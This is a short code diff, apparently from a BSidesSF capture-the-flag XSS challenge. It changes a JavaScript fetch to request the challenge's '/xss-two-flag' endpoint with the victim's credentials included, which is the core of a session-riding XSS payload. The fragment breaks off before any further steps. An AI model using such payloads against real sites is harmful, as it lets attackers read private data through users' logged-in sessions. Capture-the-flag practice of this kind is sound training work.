@@ -1,6 +1,6 @@
 (async () => {
   try {
-    const res = await fetch('/xss-two-flag', {
+    const res = await fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', {
       credentials: 'include'
     });
 
